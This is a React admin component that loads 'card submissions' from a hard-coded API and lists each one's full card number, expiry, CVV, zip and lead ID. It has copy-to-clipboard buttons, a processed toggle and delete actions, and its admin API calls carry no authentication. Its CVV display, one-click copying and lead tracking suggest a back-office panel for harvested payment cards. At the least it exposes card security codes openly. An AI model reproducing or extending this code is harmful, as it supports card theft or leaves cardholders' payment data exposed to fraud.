import React, { useEffect, useState } from "react";

const AdminCardViewer = () => {
  const [cards, setCards] = useState([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");

  const fetchCards = async () => {
    try {
      const res = await fetch("https://frightening-print-production.up.railway.app/api/admin/cards");
      const data = await res.json();
      setCards(data);
    } catch (err) {
      console.error("Failed to load cards:", err);
    } finally {
      setLoading(false);
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      alert("Copied to clipboard: " + text);
    });
  };

  const deleteCard = async (id) => {
    if (!window.confirm("Are you sure you want to delete this card?")) return;
    try {
      await fetch(`https://frightening-print-production.up.railway.app/api/admin/cards/${id}`, {
        method: "DELETE",
      });
      setCards((prev) => prev.filter((card) => card.id !== id));
    } catch (err) {
      console.error("Failed to delete card:", err);
    }
  };

  

  const toggleProcessed = async (id, newValue) => {
    try {
      await fetch(`https://frightening-print-production.up.railway.app/api/admin/cards/${id}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ processed: newValue }),
      });
      setCards((prev) =>
        prev.map((card) =>
          card.id === id ? { ...card, processed: newValue } : card
        )
      );
    } catch (err) {
      console.error("❌ Failed to update processed state:", err);
    }
  };

  useEffect(() => {
    fetchCards();
  }, []);

  if (loading) return <p className="p-6">Loading cards...</p>;

  const filteredCards = cards.filter((card) => {
    const searchText = search.toLowerCase();
    return (
      card.cardName.toLowerCase().includes(searchText) ||
      card.cardNumber.includes(searchText) ||
      card.zip.includes(searchText) ||
      card.leadId?.toLowerCase().includes(searchText) ||
      (searchText === "processed" && card.processed) ||
      (searchText === "unprocessed" && !card.processed)
    );
  });

  return (
    <div className="p-6 max-w-6xl mx-auto">
      <h1 className="text-2xl font-bold mb-6 flex items-center gap-2">
        💳 Secure Card Submissions
      </h1>
  
      <div className="mb-4">
        <input
          type="text"
          placeholder="Search by name, card number, zip, or 'processed'"
          className="w-full p-2 border border-gray-300 rounded"
          value={search}
          onChange={(e) => setSearch(e.target.value)}
        />
      </div>
  
      {cards.length === 0 ? (
        <p>No saved cards.</p>
      ) : (
        <div className="overflow-x-auto">
          <table className="w-full text-sm border-collapse">
            <thead className="bg-gray-100 text-gray-700">
              <tr>
                <th className="p-2 text-left whitespace-nowrap">Name</th>
                <th className="p-2 text-left whitespace-nowrap">Card</th>
                <th className="p-2 text-left whitespace-nowrap">Expiry</th>
                <th className="p-2 text-left whitespace-nowrap">CVV</th>
                <th className="p-2 text-left whitespace-nowrap">Zip</th>
                <th className="p-2 text-left whitespace-nowrap">Lead ID</th>
                <th className="p-2 text-left whitespace-nowrap">Created</th>
                <th className="p-2 text-left whitespace-nowrap">Actions</th>
              </tr>
            </thead>
            <tbody>
              {filteredCards.map((card) => (
                <tr key={card.id} className="border-t hover:bg-gray-50">
                  <td className="p-2 whitespace-nowrap">{card.cardName}</td>
  
                  <td className="p-2 whitespace-nowrap">
                    <div className="flex items-center gap-1">
                      {card.cardNumber}
                      <button
                        onClick={() => copyToClipboard(card.cardNumber)}
                        className="text-blue-500 hover:text-blue-700"
                        title="Copy card"
                      >
                        📋
                      </button>
                    </div>
                  </td>
  
                  <td className="p-2 whitespace-nowrap">{card.expiry}</td>
  
                  <td className="p-2 whitespace-nowrap">
                    <div className="flex items-center gap-1">
                      {card.cvv}
                      <button
                        onClick={() => copyToClipboard(card.cvv)}
                        className="text-blue-500 hover:text-blue-700"
                        title="Copy CVV"
                      >
                        📋
                      </button>
                    </div>
                  </td>
  
                  <td className="p-2 whitespace-nowrap">
                    <div className="flex items-center gap-1">
                      {card.zip}
                      <button
                        onClick={() => copyToClipboard(card.zip)}
                        className="text-blue-500 hover:text-blue-700"
                        title="Copy Zip"
                      >
                        📋
                      </button>
                    </div>
                  </td>
  
                  <td className="p-2 whitespace-nowrap max-w-[160px] truncate">
                    <div className="flex items-center gap-1">
                      <span className="truncate">{card.leadId}</span>
                      <button
                        onClick={() => copyToClipboard(card.leadId)}
                        className="text-blue-500 hover:text-blue-700"
                        title="Copy Lead ID"
                      >
                        📋
                      </button>
                    </div>
                  </td>
  
                  <td className="p-2 whitespace-nowrap">
                    {new Date(card.createdAt).toLocaleDateString()}{" "}
                    {new Date(card.createdAt).toLocaleTimeString([], {
                      hour: "2-digit",
                      minute: "2-digit",
                    })}
                  </td>
  
                  <td className="p-2 whitespace-nowrap">
                    <div className="flex items-center gap-2">
                      <button
                        onClick={() =>
                          toggleProcessed(card.id, !card.processed)
                        }
                        className={`text-xs px-3 py-1 rounded font-medium transition-all duration-200 ${
                          card.processed
                            ? "bg-green-100 text-green-700 hover:bg-green-200"
                            : "bg-yellow-100 text-yellow-700 hover:bg-yellow-200"
                        }`}
                      >
                        {card.processed ? "✔ Processed" : "☑ Mark Done"}
                      </button>
                      <button
                        onClick={() => deleteCard(card.id)}
                        className="text-xs text-red-600 hover:underline"
                        title="Delete"
                      >
                        🗑 Delete
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
  

};

export default AdminCardViewer;
